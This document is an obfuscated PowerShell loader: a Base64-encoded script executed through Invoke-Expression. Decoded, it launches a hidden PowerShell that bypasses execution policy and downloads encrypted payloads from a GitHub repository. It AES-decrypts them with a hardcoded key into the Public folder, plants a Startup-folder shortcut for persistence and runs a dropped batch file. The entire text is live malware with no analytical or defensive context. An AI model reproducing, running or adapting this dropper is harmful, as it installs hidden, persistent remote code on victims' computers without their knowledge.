$e = [System.Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1Bcmd1bWVudExpc3QgIi1XaW5kb3dTdHlsZSBIaWRkZW4gLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgYA0KJHVybCA9ICdodHRwczovL2dpdGh1Yi5jb20vYmFkZ29kODQvUHJvamVjay9yYXcvcmVmcy9oZWFkcy9tYWluL2RhdGEudHh0JyBgDQokb3V0cHV0RmlsZTEgPSAnQzpcVXNlcnNcUHVibGljXFdpbmRvd3MubGF1bmNoJyBgDQokb3V0cHV0RmlsZTIgPSAnQzpcVXNlcnNcUHVibGljXFN5c3RlbS5iYXQnIGANCiRvdXRwdXRGaWxlMyA9ICdDOlxVc2Vyc1xQdWJsaWNcU3RhcnR1cC52YnMnIGANCiRrZXkgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCdUaGlzSXNBMTZCeXRlS2V0JykgYA0KJGl2ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygnMTZCeXRlSW5pdFZlY3RvdCcpIGANCg0KJHRlbXBGaWxlUGF0aCA9ICckZW52OlRFTVBcY29kZS50eHQnIGANCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkdGVtcEZpbGVQYXRoIGANCg0KJGNvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkdGVtcEZpbGVQYXRoIC1SYXcgYA0KJHBhcnRzID0gJGNvbnRlbnQgLXNwbGl0ICc9PT1TUExJVD09PScgYA0KDQpmdW5jdGlvbiBEZWNyeXB0LUZpbGUgeyBgDQogICAgcGFyYW0gKFtzdHJpbmddJGVuY3J5cHRlZERhdGEpIGANCiAgICAkYWVzID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkgYA0KICAgICRhZXMuS2V5ID0gJGtleSBgDQogICAgJGFlcy5JViA9ICRpdiBgDQogICAgJGFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQyBgDQoNCiAgICAkZW5jcnlwdGVkQnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlbmNyeXB0ZWREYXRhKSBgDQogICAgJGRlY3J5cHRvciA9ICRhZXMuQ3JlYXRlRGVjcnlwdG9yKCkgYA0KICAgICRkZWNyeXB0ZWREYXRhID0gJGRlY3J5cHRvci5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRlbmNyeXB0ZWRCeXRlcywgMCwgJGVuY3J5cHRlZEJ5dGVzLkxlbmd0aCkgYA0KICAgICRkZWNyeXB0b3IuRGlzcG9zZSgpIGANCiAgICAkYWVzLkRpc3Bvc2UoKSBgDQogICAgcmV0dXJuICRkZWNyeXB0ZWREYXRhIGANCn0gYA0KDQpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvdXRwdXRGaWxlMSwgKERlY3J5cHQtRmlsZSAtZW5jcnlwdGVkRGF0YSAkcGFydHNbMF0pKSBgDQpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvdXRwdXRGaWxlMiwgKERlY3J5cHQtRmlsZSAtZW5jcnlwdGVkRGF0YSAkcGFydHNbMV0pKSBgDQpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvdXRwdXRGaWxlMywgKERlY3J5cHQtRmlsZSAtZW5jcnlwdGVkRGF0YSAkcGFydHNbMl0pKSBgDQoNCiMgVGjDqm0gc2hvcnRjdXQgY+G7p2Egc3RhcnR1cC52YnMgdsOgbyB0aMawIG3hu6VjIFN0YXJ0dXANCiRzaG9ydGN1dFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6QVBQREFUQSwgJ01pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxTdGFydHVwLnZicy5sbmsnKSBgDQokd3NoU2hlbGwgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV1NjcmlwdC5TaGVsbCBgDQokc2hvcnRjdXQgPSAkd3NoU2hlbGwuQ3JlYXRlU2hvcnRjdXQoJHNob3J0Y3V0UGF0aCkgYA0KJHNob3J0Y3V0LlRhcmdldFBhdGggPSAkb3V0cHV0RmlsZTMgYA0KJHNob3J0Y3V0LlNhdmUoKSBgDQoNClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDkgYA0KU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG91dHB1dEZpbGUyDQoiDQo='); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated
